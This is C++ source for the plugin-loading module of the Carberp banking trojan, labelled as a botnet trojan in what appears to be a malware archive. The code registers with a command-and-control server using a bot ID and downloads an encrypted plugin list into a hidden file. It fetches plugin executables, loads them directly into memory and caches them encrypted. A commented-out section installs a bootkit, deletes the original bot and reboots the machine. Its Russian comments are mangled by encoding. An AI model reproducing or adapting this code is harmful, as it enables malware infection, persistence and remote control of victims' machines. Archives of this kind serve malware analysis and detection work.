/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#include <shlobj.h>

#include "BotCore.h"
#include "BotHTTP.h"
#include "Plugins.h"
#include "HTTPConsts.h"
#include "md5.h"
//#include "KillOs_Reboot.h"


//---------------------------------------------------------------------------


// ������ �������� ��� ������ ���������� �����������

//#include "BotDebug.h"

namespace PLGDEBUGTEMPLATES
{
    #include "DbgTemplates.h"
}
#define PDBG  PLGDEBUGTEMPLATES::DBGOutMessage<>


//---------------------------------------------------------------------------

// ������ ��� �������� � �������� ���� ��������
namespace PLGLoader
{

	// ������ ���������� �����. ���������� ������������ ���������� �
	// ���������� ���� ������ ���������� ����� �� �������� ���������
    const static char PluginListPassword[] = {'G', 'D', 'l', 'e', 't', '6', '4', 'E',  0};

    // ��������� ����� ������
	#define PLUGINS_LIST_FILE_SIGNATURE 0xF3C5A945

	// ������ ����� ������ ��������
	#define PLUGINS_LIST_FILE_VERSION 1

	//-------------------------------------------------------------------------

	// ��������� ����� ��������
	#pragma pack(push, 1)
	typedef struct TFileHeader
	{
		DWORD Signature;   // ��������� �����
		DWORD Version;     // ������ �����
		DWORD UpdateTime;  // ����� ���������� ���������� (� �����)
        DWORD HostHash;    // ��� ����� ��� �������� ��������� ������
        DWORD DataSize;    // ������ ������
	} *PFileHeader;
	#pragma pack(pop)

	//-------------------------------------------------------------------------

	PCHAR GetFileName()
	{
		// ������� ���������� ��� ����� ������ ��������
		const static char PluginsListFileName[] = {'w', 'n', 'd', 's', 'k', 's', 'i', '.', 'i', 'n', 'f',  0};

		return BOT::GetWorkPath(NULL, (PCHAR)PluginsListFileName);
	}

	//-------------------------------------------------------------------------
	bool NeedUpdateFile(PCHAR FileName, PCHAR Host)
	{
		// ������� ������ ������ ���� ���������� �����������
		// ������ ��������

		// ��������� ���� ��� ������
		HANDLE File = pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0,
							OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

		if (File == INVALID_HANDLE_VALUE)
		{
			//  ���������� ������ ���� ���� �� ������
			return (DWORD)pGetLastError() == ERROR_FILE_NOT_FOUND;
		}

		// ������ ��������� �����
		TFileHeader H;
		ClearStruct(H);

		DWORD Readed;
		pReadFile(File, &H, sizeof(H), &Readed, NULL);
		if (Readed != sizeof(H))
		{
			// ��������� ����
			pCloseHandle(File);
            return true;
		}


		// ��������� � �����-�� ����� ���� ���������� ��������
		bool Result = H.HostHash != CalcHash(Host);

		pCloseHandle(File);
		return Result;

    }
	//-------------------------------------------------------------------------

	void DoWriteBufferToFile(HANDLE File, PCHAR Buf, PCHAR Host)
	{
		// ������� ���������� ����������� ����� � ����

		DWORD Writed;

		// ���������� ��������� �����

		TFileHeader H;

		H.Signature  = PLUGINS_LIST_FILE_SIGNATURE;
		H.Version    = PLUGINS_LIST_FILE_VERSION;
		H.UpdateTime = (DWORD)pGetTickCount();
		H.HostHash   = CalcHash(Host);
		H.DataSize   = STR::Length(Buf);

		pWriteFile(File, &H, sizeof(H), &Writed, NULL);

		if (H.DataSize == 0)
			return;

		// ������� �����
        XORCrypt::Crypt((PCHAR)PluginListPassword, (LPBYTE)Buf, H.DataSize);

        // ���������� � ����
		pWriteFile(File, Buf, H.DataSize, &Writed, NULL);
	}
    //-------------------------------------------------------------------------

	bool DownloadListInFile(PCHAR FileName, PCHAR URL, PCHAR Host)
	{
		// ������� ��������� ������ �������� � ����
		// �� ����� �������� ���� �����������

		// ������ ���� ��� ������
		HANDLE File = (HANDLE)pCreateFileA(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,  FILE_ATTRIBUTE_HIDDEN, NULL);

		if (File == INVALID_HANDLE_VALUE)
		{
			// � ������ ������ �������� ����� ��� ������ ������ ����������
			// ������� ������ � ������ ������ ������ �������, ��� ��������
			// ��������� ����� ������ ���������/������� ��� �������� ������
			return pGetLastError() == ERROR_SHARING_VIOLATION;
		}


		// ��������� ��� �������� ������ ��������
        PDBG("Plugins", "��������� ������ ��������");
		PCHAR Buf = NULL;
		do
		{
			PDBG("Plugins", "try to DownloadPluginList('%s')", URL);
			Buf = Plugin::DownloadPluginList(URL);
			if (Buf != NULL)
			{
				// ���������� ������ � ����
				PDBG("Plugins", "������ �������� ��������");
                DoWriteBufferToFile(File, Buf, Host);
			}
			else
			{
				PDBG("Plugins", "DownloadPluginList failed. Sleeping 30 sec...");
				pSleep(30 * 1000);
			}
		}
		while (Buf == NULL);
				
		// ��������� ����
		pCloseHandle(File);

		return true;
	}
    //-------------------------------------------------------------------------

	PCHAR ReadListFromFile(PCHAR FileName)
	{
		// ������� ��������� ������ �������� �� �����

		DWORD Size = 0;
		LPBYTE Buf = File::ReadToBufferA(FileName, Size);
		if (Buf == NULL)
			return NULL;
		if (Size < sizeof(TFileHeader))
		{
			MemFree(Buf);
			return NULL;
        }

		// �������� ���������
		PFileHeader H = (PFileHeader)Buf;

		if (H->DataSize > (Size - sizeof(TFileHeader)))
		{
			// ���� ���� �����, ���� �� ���
			MemFree(Buf);
            pDeleteFileA(FileName);
			return NULL;
        }

		// ������� �����
		LPBYTE Temp = Buf + sizeof(TFileHeader);
        XORCrypt::Crypt((PCHAR)PluginListPassword, Temp, H->DataSize);

		PCHAR Str = STR::New((PCHAR)Temp, H->DataSize);
		MemFree(Buf);

		return Str;

	}
	//------------------------------------------------------------------------

	PCHAR ExtractPluginURL(PCHAR PluginName, PCHAR Buf)
	{
		// ������� ��������� ����� ������� �� �������
		if (Buf == NULL)
			return NULL;

		// ���������� ����� ��� ����� ������
		// ���� �� �����, �� ����������� ������ �� ����� ����� � ���������� URL � ���� <name>|md5
		// ����� ��������� �� ������ �� URL ����� ������� MD5 � ������������ ���������� URL
		int DoubleEmptyStringPos = STR::Pos(Buf, "\r\n\r\n", 0);
		if (DoubleEmptyStringPos > 0)
		{
			PDBG("ExtractPluginURL", "New format of list detected. Move pointer to new list begin.");
			Buf += (DoubleEmptyStringPos + 4);
		}

		// ���������� ������� ����� � ������
		int Pos = STR::Pos(Buf, PluginName, 0);
		if (Pos < 0)
			return NULL; // � ������ ��� ������� �������

		// ���������� ����������� |
		PCHAR Start = Buf + Pos;
		PCHAR End = Start;
		while (*End != '|') End++;
		End++;

		Start = End;

		// ���������� ����� ������
		while (*End != 0 && *End != 10 && *End != 13) End++;

		// ���������� �����
		return STR::New(Start, End - Start);
	}
}



const static char* PluginsCacheFolder = "pgcache"; ;

//=========================================================================

string GetPluginCacheFileName(PCHAR PluginName)
{
	return BOT::MakeFileName(PluginsCacheFolder, PluginName);
}
//-------------------------------------------------------------------------


//****************************************************************************
//  ������ ������ � ���������
//****************************************************************************

PCHAR Plugin::GetURL(PCHAR Name, PCHAR PluginsListURL, bool UpdateList)
{
	// ������� ���������� ����� �� �������� ����� ��������� ������
	if (STR::IsEmpty(Name))
		return NULL;

	PDBG("Plugins", "�������� ����� ������� [%s]", Name);

	// �������� ����� ��������
	bool FreeURL = false;
	if (STR::IsEmpty(PluginsListURL))
	{
		FreeURL = true;
		PluginsListURL = GetBotScriptURL(SCRIPT_PLUGINS_LIST);
	}
	if (PluginsListURL != NULL)
	{
    	PDBG("Plugins", "����� ������ ��������: \r\n   [%s]", PluginsListURL);
	}
	else
	{
		PDBG("Plugins", "�� ������� �������� ����� ������ ��������!");
		return NULL;
    }

	// ������������ ����� ������ �������� ��� ��������� �����
	TURLREC URLRec;
	ClearStruct(URLRec);

	ParseURL(PluginsListURL, &URLRec);

	// �������� ��� ����� � ������� �������� ������ ��������
    PCHAR FileName = PLGLoader::GetFileName();
	PDBG("Plugins", "��� ����� �� ������� �������� [%s]", FileName);

	// ���� ������. ��������� ������ ��������
	// ��������� � ������ ���� UpdateList == true ���� ��������� ����
	// ����������� �� �����
	// �� ������ ������ �������� ������� ����������� ��������
	if (UpdateList || PLGLoader::NeedUpdateFile(FileName, URLRec.Host))
	{
		bool Completed = false;
		do
		{
			PDBG("Plugins", "���������� ������� ������ �� ����. ������� �������");
			if (PluginsListURL != NULL)
				Completed = PLGLoader::DownloadListInFile(FileName, PluginsListURL, URLRec.Host);

			if (!Completed)
			{
				pSleep(3000);
				if (FreeURL)
				{
					ClearURL(&URLRec);
					STR::Free(PluginsListURL);
					PluginsListURL = GetBotScriptURL(SCRIPT_PLUGINS_LIST);
                    ParseURL(PluginsListURL, &URLRec);
                }
			}

		}
		while (!Completed);
	}
	else 
	{
		PDBG("Plugins", "������� �� ���� �� ����. ��������� �� ����� ����.");
	}

	// ���� ������: �������� ��������� ����
	// ������ �� ����� ���-�� �����������. ������ �� ������� ����, ���
	// � ������ ������ ����� ���� �������� ������ � ������� ������ NULL
	PCHAR Buf = NULL;
	do
	{
		Buf = PLGLoader::ReadListFromFile(FileName);
		if (Buf == NULL)
			pSleep(60000);
	}
	while (Buf == NULL);

	//���� ������: �������� ������
	PCHAR FullURL = NULL;
	//File::WriteBufferA( "c:\\plg.txt", Buf, STR::Length(Buf) );
	PCHAR URLFileName = PLGLoader::ExtractPluginURL(Name, Buf);
	if (URLFileName != NULL)
	{
		PDBG("Plugins", "���� � �������: [%s]", URLFileName);
		FullURL = STR::New(5, ProtocolHTTP, HTTPProtocolDelimeter, URLRec.Host, "/", URLFileName );
		STR::Free(URLFileName);
	}

	STR::Free(FileName);
	STR::Free(Buf);
	if (FreeURL) STR::Free(PluginsListURL);
	ClearURL(&URLRec);

	
	PDBG("Plugins", "����� �������: [0x%X : '%s']", FullURL, 
		((FullURL == NULL) ? "(null)":FullURL));

	return FullURL;
}
//---------------------------------------------------------------------------


PCHAR Plugin::DownloadPluginList(PCHAR URL)
{
	// ��������� ������ �������� ��������� �� ������� �������

	bool FreeURL = false;
	if (URL == NULL)
	{
		FreeURL = true;
		URL = GetBotScriptURL(SCRIPT_PLUGINS_LIST);
	}
	if (URL == NULL) return NULL;

    // ���������� ���� ������
	PCHAR Result = NULL;
	PCHAR BotID = GenerateBotID();

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "botuid", BotID);

	THTTPResponseRec Response;
    ClearStruct(Response);

	#ifdef CryptHTTPH
		PCHAR Password = GetMainPassword();
		CryptHTTP::Post(URL, Password, Fields, &Result, &Response);
		STR::Free(Password);
	#else
		HTTP::Post(URL, Fields, &Result, NULL);
	#endif

    // ���������� ��������� ������ �������
	if (FreeURL) STR::Free(URL);
	STR::Free(BotID);
	Strings::Free(Fields);

	if (Response.Code != 200)
		STR::Free2(Result);

    HTTPResponse::Clear(&Response);


    PDBG("Plugins", "���������� ������������ ������ ��������: \r\n: [%s]", Result);

	return Result;
}
//---------------------------------------------------------------------------

LPBYTE Plugin::DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileSize, PCHAR* PluginMd5)
{

	//  ������� ��������� ���� ������� � �������. ���� �������
	//	� ���������� ���������, �.�. �� ����������������.

	if (FileSize != NULL)
		*FileSize = 0;
	PDBG("Plugins", "��������� ���� ������� [%s]", PluginName);

	// ��������� ���� �������� �������
	bool UpdateList = false;
	DWORD UpdateCount = 0; // ������� ���������� ������

	if (PluginMd5 != NULL) *PluginMd5 = NULL;

    LPBYTE Module = NULL;
	do
	{
		// �������� ������ ����� �������

		PCHAR URL = GetURL(PluginName, PluginsListURL, UpdateList);

		if (URL == NULL)
		{
			// �� ������� ����������� ������������� ������
			PDBG("Plugins", "GetURL('%s', '%s', %d) ������ NULL. ���� 30 ��� � ������� ���.", 
				PluginName, PluginsListURL, UpdateList);
			pSleep(30 * 1000);
			UpdateList = true;
			continue;
		}

		// � ������ �� ������� ���������� ������, ����� ��������� ��������
		// ������� ����, ���������������� �����
		if (UpdateList && UpdateCount > 1)
		{
			DWORD Interval = 60000;

			if (UpdateCount > 10)
			{
				if (UpdateCount <= 20)
					Interval = Interval * 2;
				else
				if (UpdateCount <= 100)
					Interval = Interval * 3;
				else
					Interval = Interval * 5;
			}

			PDBG("Plugins", "DownloadFile: Sleep because UpdateCount>0 (interval='%u' updatecount='%u').",
				Interval, UpdateCount);

			pSleep(Interval);
		}

		// ���������� MD5 ����� � URL � ������������ �������������� URL
		int md5pos = STR::Pos(URL, "|", 0);
		if (md5pos > 0)
		{
			PCHAR Md5Sum = STR::New(URL + md5pos + 1);
			URL[md5pos] = '\0';

			PDBG("Plugins", "DownloadFile: MD5 detected in URL (url='%s' md5='%s').",
				URL, Md5Sum);
			
			if (PluginMd5 != NULL) *PluginMd5 = Md5Sum;
		}


		// ��������� ��������

		THTTPResponseRec Response;
		ClearStruct(Response);

		PCHAR Document = NULL;
		#ifdef CryptHTTPH
			PCHAR Pass = GetMainPassword();

			bool Loaded = CryptHTTP::Get(URL, Pass, &Document, &Response);
			STR::Free(Pass);
		#else
			bool Loaded = HTTP::Get(URL, &Document, &Response);
		#endif

		STR::Free(URL);

		PDBG("Plugins", "DownloadFile: file load result=%d", Loaded);

		// ������������ ��������� ��������
		UpdateList = false;

		if (Loaded)
		{
			PDBG("Plugins", "DownloadFile: Http file loaded with HttpResponseCode='%u'", Response.Code);
			if (Response.Code == HTTP_CODE_OK)
			{
				PDBG("Plugins", "������ [%s] ������� ��������", PluginName);
				// �������� ����
				DWORD Size = STR::Length(Document);
				Module = (LPBYTE)MemAlloc(Size);
				if (Module == NULL) break;

				// �������� ��������
                m_memcpy(Module, Document, Size);
				if (FileSize != NULL)
					*FileSize = Size;
			}
			else
			{
				UpdateList = true;
				UpdateCount++;
			}
		}
		else
		{
			// � ������ ���������� ��������� �������� �� ��������� �����
			PDBG("Plugins", "DownloadFile: Loaded=false. Sleep 60 sec.");
			pSleep(60000);
        }

		HTTPResponse::Clear(&Response);
	}
	while (Module == NULL);

    return Module;
}
//---------------------------------------------------------------------------

LPBYTE Plugin::Decode(LPBYTE Buffer, DWORD BufferSize, bool IsExecutable, DWORD *NewBufferSize)
{
	// ������� ���������� ������.
	if (NewBufferSize != NULL)
		*NewBufferSize = 0;

	if (Buffer == NULL || BufferSize == 0)
		return NULL;

	// �������������� XOR ����������
	const static char Signature[] = {'B', 'J', 'B', 0};
	DWORD Size = BufferSize;
	LPBYTE Body = XORCrypt::DecodeBuffer((PCHAR)Signature, Buffer, Size);

	if (Body == NULL)
	{
		// ������� ��������� ��������, ��� ������ �� ��� ����������
		// XOR ������������
		Body = Buffer;
		Size = BufferSize;
	}

	// ������ ������ ������
	LPBYTE Module = NULL;
	if (Body != NULL && Size > 0 && (!IsExecutable || IsExecutableFile(Body)))
	{
		Module = (LPBYTE)MemAlloc(Size);
 		if (Module != NULL)
		{
			m_memcpy(Module, Body, Size);
			if (NewBufferSize != NULL)
				*NewBufferSize = Size;
		}
	}

	return Module;
}

//---------------------------------------------------------------------------

//---------------------------------------------------------------------------

LPBYTE Plugin::Download(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size, bool IsExecutable)
{
	// ������� ��������� � ����������� ������
	return DownloadEx(PluginName, PluginListURL, Size, IsExecutable, false, NULL);
}
//---------------------------------------------------------------------------


LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
				  bool IsExecutable, bool UseCache, PCHAR CachePath)
{
	if (Size) *Size = 0;

	if (STRA::IsEmpty(PluginName)) return NULL;

	// ������ ����� �� ����������� ����� �����.
	// ������������ �������� MD5 �����.
	while (true)
	{
		DWORD  BufSize = 0;
		LPBYTE Buffer = NULL;
		PCHAR  ReceivedMd5 = NULL;

		// ��������� ������� ����� � ���� � ���� ������������� ����
		if (UseCache)
		{
			Buffer = LoadFromCache(PluginName, &BufSize);
		}

		// ��������� ���� ������� �� ����, ����:
		// 1) ��������� ���� ������������� ���� � �� ������� ��������� ����
		// 2) �� ��������� ���� ������������� ����
		bool Downloaded = false;
		if (Buffer == NULL)
		{
			Buffer = DownloadFile(PluginName, PluginListURL, &BufSize, &ReceivedMd5);
			Downloaded = true;
		}

		if (Buffer == NULL)
		{
			if (ReceivedMd5 != NULL) STR::Free(ReceivedMd5);
			return NULL;
		}


		// 2. �������������� ������
		// ������ ������: ���� �� ����� �������������� ������ � ������, ���� 
		// ��������� ���� "IsExecutable" � ���������� ���� ������������� ����� PE 
		// ���������

		string CalculatedMd5 = MD5StrFromBuf(Buffer, BufSize);

		LPBYTE Module = NULL;

		if (!IsExecutable || !IsExecutableFile(Buffer))
			Module = Decode(Buffer, BufSize, IsExecutable, &BufSize);
		else
			Module = Buffer;

		// ���� ���� ��� ������� � ���� �������� MD5 - ��������� MD5 �����.
		// ���� ����������� ����� �� ������� - ������� ���������� �� ������.
		if (ReceivedMd5 && Module)
		{
			bool Valid = CalculatedMd5 == ReceivedMd5;

			STR::Free(ReceivedMd5);

			if (!Valid)
			{
				// ����������� �������
				MemFree(Buffer);
				if (Module != Buffer) MemFree(Module);

				// ������� ���� � ��������� ������� ������
				PDBG("Plugins", "DownloadEx: ReceivedMd5 and CalculatedMd5 are not equal. Sleeping 30 sec and trying again.");
				pSleep(30 * 1000);
				continue;
			}
		}

		// ��� ������������� �������� ����:
		// ����� ��������� ���� ������������� ���� � ���� ��� ������ �� ����
		if (UseCache && Downloaded && Module)
		{
			SaveToCache(PluginName, Module, BufSize);
		}

		// ����������� ������
		if (Module != Buffer) MemFree(Buffer);

		// ���������� ���������
		if (Size != NULL)
			*Size = BufSize;
		
		return Module;
	}

	return NULL;
}
//---------------------------------------------------------------------------


//-----------------------------------------------
//  SaveToCache
//  �������� ������ �������
//-----------------------------------------------
bool Plugin::SaveToCache(PCHAR PluginName,  LPVOID Data, DWORD DataSize)
{
	bool Result = false;
	if (Data && DataSize && !STRA::IsEmpty(PluginName))
	{
		string FN = GetPluginCacheFileName(PluginName);
		Result = CryptFile::WriteFromBuffer(FN.t_str(), Data, DataSize);
    }
	return Result;
}



//------------------------------------------------
//  LoadFromCache
//  ������� ��������� ������ �� ����
//------------------------------------------------
LPBYTE Plugin::LoadFromCache(PCHAR PluginName, DWORD *PluginSize)
{
	LPBYTE Result = NULL;
	if (!STRA::IsEmpty(PluginName))
	{
		string FN = GetPluginCacheFileName(PluginName);
		Result = (LPBYTE)CryptFile::ReadToBuffer(FN.t_str(), PluginSize);
    }
	return Result;
}


//------------------------------------------------
//  DeleteFromCache
//  ������� �������  ���� ������� �� ����
//------------------------------------------------
bool Plugin::DeleteFromCache(PCHAR PluginName)
{
	bool Result = false;
	if (!STRA::IsEmpty(PluginName))
	{
		string FN = GetPluginCacheFileName(PluginName);
		Result = (BOOL)pDeleteFileA(FN.t_str());
    }
	return Result;
}


/*
bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	CHAR  PlugName[MAX_BOT_PLUG_NAME_SIZE];

	PDBG("Plugins", "ExecuteUpdatePlug: '%s'", Args);
	
	GetBotParameter(BOT_PARAM_BOTPLUGNAME, PlugName, ARRAYSIZE(PlugName) - 1);

	DWORD  CachedFileSize = 0;
	LPBYTE CachedFile = DownloadFromCache(PlugName, true, NULL, &CachedFileSize);
	PDBG("Plugins", "ExecuteUpdatePlug: DownloadFromCache() return body=0x%X size=%d", CachedFile, 
		CachedFileSize);

	DWORD  NetworkFileSize = 0;
	LPBYTE NetworkFile = DownloadEx(PlugName, NULL, &NetworkFileSize, true, false, NULL);
	PDBG("Plugins", "ExecuteUpdatePlug: Download() return body=0x%X size=%d", NetworkFile, 
		NetworkFileSize);

	PCHAR CacheFileName = PLGCACHE::GetPluginCacheFileName(NULL, PlugName);

	do
	{
		PDBG("Plugins", "ExecuteUpdatePlug: check is file loaded from network");
		// ��������� ���������� �� ����
		if (NetworkFile == NULL) break;

		// ��������� ������ (PE)
		PDBG("Plugins", "ExecuteUpdatePlug: check file from network for PE");
		if (!IsExecutableFile(NetworkFile)) break;

		// ������� md5 �����
		PDBG("Plugins", "ExecuteUpdatePlug: compare md5 summs");
		if (CachedFile != NULL)
		{
			char sumCached[40];
			char sumNetwork[40];

			m_memset(sumCached, 0, sizeof(sumCached));
			m_memset(sumNetwork, 0, sizeof(sumNetwork));

			CalcMd5SummFromBuffer(CachedFile, CachedFileSize, sumCached, sizeof(sumCached));
			CalcMd5SummFromBuffer(NetworkFile, NetworkFileSize, sumNetwork, sizeof(sumNetwork));

			int sumCompareResult = m_memcmp(sumCached, sumNetwork, 32);
			PDBG("Plugins", "ExecuteUpdatePlug: sumCompareResult=%d", sumCompareResult);

			// ���� ����� ��������� - ������ �� ������.
			if (sumCompareResult == 0) break;
		}
		
		// ��������� ���������� �� �������� ����� ��� ����.
		if (CacheFileName == NULL) break;
		
		DWORD written = CryptFile::WriteFromBuffer(CacheFileName, NetworkFile, NetworkFileSize, NULL);
		PDBG("Plugins", "ExecuteUpdatePlug: CryptFile::WriteFromBuffer() return %d", written);

		// �� ���������� ��������.
		if (written == 0) break;

		STR::AnsiLowerCase(Args);

		PDBG("Plugins", "ExecuteUpdatePlug: checking reboot argument ('%s').", Args);
		if (m_lstrcmp(Args, "reboot-after-update") == 0) 
		{
			PDBG("Plugins", "ExecuteUpdatePlug: reboot argument specified. ('%s').", Args);
			Reboot();
		}

		return true;
	}
	while (0);


	if (CachedFile) MemFree(CachedFile);
	if (NetworkFile) MemFree(NetworkFile);
	if (CacheFileName) STR::Free(CacheFileName);

	return false;
}

void BotSelfRemove()
{
	BOT::Unprotect();

	string BotPath = BOT::GetBotFullExeName();
	PDBG("BotSelfRemove", "Lookup bot file '%s'", BotPath.t_str());

	DWORD attr = (DWORD)pGetFileAttributesA(BotPath.t_str());
	PDBG("BotSelfRemove", "'%s' attributes 0x%X", BotPath.t_str(), attr);
	if (attr == INVALID_FILE_ATTRIBUTES) return;

	PDBG("BotSelfRemove","Trying to delete file '%s'", BotPath.t_str());
	pSetFileAttributesA(BotPath.t_str(), FILE_ATTRIBUTE_ARCHIVE);
	if (!(BOOL)pDeleteFileA(BotPath.t_str()))
	{
		PDBG("BotSelfRemove","DeleteFile failed (%u). Try pending remove.",(DWORD)pGetLastError());
		pMoveFileExA(BotPath.t_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
	}
}

void AsyncInstallBk(void* Arguments)
{
	PCHAR PlugName = (PCHAR)Arguments;
	STR::AnsiLowerCase(PlugName);

	PDBG("AsyncInstallBk", "Started with '%s'", PlugName);

	DWORD  BkInstallPlugSize = 0;
	LPBYTE BkInstallPlug = Plugin::DownloadEx(PlugName, NULL, &BkInstallPlugSize, true, false, NULL);
	PDBG("AsyncInstallBk", "Download() return body=0x%X size=%d", BkInstallPlug, 
		BkInstallPlugSize);

	do
	{
		PDBG("AsyncInstallBk", "check is plug loaded from network");
		// ��������� ���������� �� ����
		if (BkInstallPlug == NULL) break;

		// ��������� ������ (PE)
		PDBG("AsyncInstallBk", "check file from network for PE");
		if (!IsExecutableFile(BkInstallPlug)) break;

		HMEMORYMODULE Module = MemoryLoadLibrary(BkInstallPlug);
		PDBG("AsyncInstallBk", "MemoryLoadLibrary() result=0x%X", Module);
		if (Module == NULL) break;

		// BkDroper.plug ������ ������������� �-��� BkDrop � BkDropUac.
		// BkDropUac - ��� �-��� ��� ��������� ����� ��������� Windows (XP/Vista/7). 
		//             � �� ��������� ���������� ���� ������������� ����������� 
		//             (�� ���� ������ BkDroper.plug).
		// BkDrop    - ��� �������� ������������� (������ ������ ����������� ������ 
		//             ��������� ������ �-��� BkDrop)
		// 

		typedef BOOL (WINAPI *BkDropFunction)();
		typedef BOOL (WINAPI *BkDropUacFunction)(const void* BkInstallBody, DWORD BkInstallBodySize);

		BkDropFunction BkDrop = (BkDropFunction)MemoryGetProcAddress(Module, "BkDrop");
		PDBG("AsyncInstallBk", "MemoryGetProcAddress('BkDrop') result=0x%X", BkDrop);

		BkDropUacFunction BkDropUac = (BkDropUacFunction)MemoryGetProcAddress(Module, "BkDropUac");
		PDBG("AsyncInstallBk", "MemoryGetProcAddress('BkDropUac') result=0x%X", BkDropUac);

		if (BkDrop == NULL && BkDropUac == NULL) break;

		BOOL BkDropResult = FALSE;
		if (BkDropUac != NULL)
		{
			// ���� ������� �-��� BkDropUac - �� ������ ����� ������������� ���.
			PDBG("AsyncInstallBk", "running BkDropUac.");
			BkDropResult = BkDropUac(BkInstallPlug, BkInstallPlugSize);
		} 
		else if (BkDrop != NULL)
		{
			// ���� �� ������� �-��� BkDropUac, �� ������� BkDrop - 
			// ��� �������� ������������ ������������ ������ �-���.
			PDBG("AsyncInstallBk", "running BkDrop.");
			BkDropResult = BkDrop();
		}

		PDBG("AsyncInstallBk", "Installation result=%d.", BkDropResult);
		if (BkDropResult == FALSE) break;

		PDBG("AsyncInstallBk", "Removing ring 3 bot version.");
		BotSelfRemove();

		PDBG("AsyncInstallBk", "Start machine reboot.");
		Reboot();
	}
	while (0);

	PDBG("AsyncInstallBk", "Finished.");
	if (BkInstallPlug) MemFree(BkInstallPlug);
	if (PlugName) STR::Free(PlugName);
}

bool Plugin::ExecuteInstallBk(void* Manager, PCHAR Command, PCHAR Args)
{
	PDBG("ExecuteInstallBk", "Args: '%s'", Args);

	PCHAR PlugName = STR::New(Args);

	StartThread(AsyncInstallBk, PlugName);

	return true;
}



bool Plugin::ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args)
{
	PDBG("ExecuteInstallBkStat", "Args: '%s'", Args);

	PCHAR ParamList = STR::New(Args);

	string PlugName = GetCommandParamByIndex(ParamList, 0);

	DebugReportSaveSettings(ParamList);

	StartThread(AsyncInstallBk, STR::New(PlugName.t_str()));

	STR::Free(ParamList);
	return true;
}
*/

//*****************************************************************************
//                                        TPlugin
//*****************************************************************************


TPlugin::TPlugin(const char*   PluginName)
	: TMemoryDLL(NULL)
{
	FName = PluginName;
	FData = NULL;
    FSize = 0;
}

TPlugin::TPlugin(const string& PluginName)
	: TMemoryDLL(NULL)
{
	FName = PluginName;
	FData = NULL;
    FSize = 0;
}

TPlugin::~TPlugin()
{
	if (FData)
		MemFree(FData);
}

//------------------------------------------
//  Download - ������� ��������� ������ ��
//             ������� �, ��� �������������,
//             ��������� � ������ ���������
//             ���
//
//  LoadLibrary - ������� �������������
//                �������� �������� ���
//------------------------------------------
bool TPlugin::Download(bool LoadLibrary)
{
	// ��������� ��������� ����������
	if (Handle() || FData || FName.IsEmpty())
		return false;

	FData = Plugin::Download(FName.t_str(), NULL, &FSize, true);

	if (FData && LoadLibrary)
		Load(FData);

	return FData != NULL;
}
